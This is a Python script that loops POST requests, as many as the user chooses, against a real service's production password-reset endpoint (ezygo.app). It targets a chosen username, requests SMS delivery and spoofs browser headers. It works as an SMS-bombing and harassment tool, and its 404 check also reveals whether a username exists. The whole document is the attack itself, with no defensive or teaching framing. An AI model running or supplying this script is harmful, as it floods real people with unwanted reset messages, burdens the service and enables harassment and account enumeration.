import requests

url = "https://production.api.ezygo.app/api/v1/Xcr45_salt/password/reset/request"

username=input("Enter the Username : ")
req=int(input("Number of request : "))

headers = {
    "Content-Type": "application/json",
    "Sec-Ch-Ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    "Accept": "application/json, text/plain, */*",
    "Sec-Ch-Ua-Mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Sec-Ch-Ua-Platform": "Windows",
    "Origin": "https://edu.ezygo.app",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://edu.ezygo.app/",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9",
}

data = {"username":username,"option":"sms"}

for i in range(req):
    response = requests.post(url, headers=headers, json=data)
    if response.status_code == 404:
        print("Username not found. Please check the username.")
        break
    else:
        print("Request {}: successfull".format(i+1, response.status_code))

       
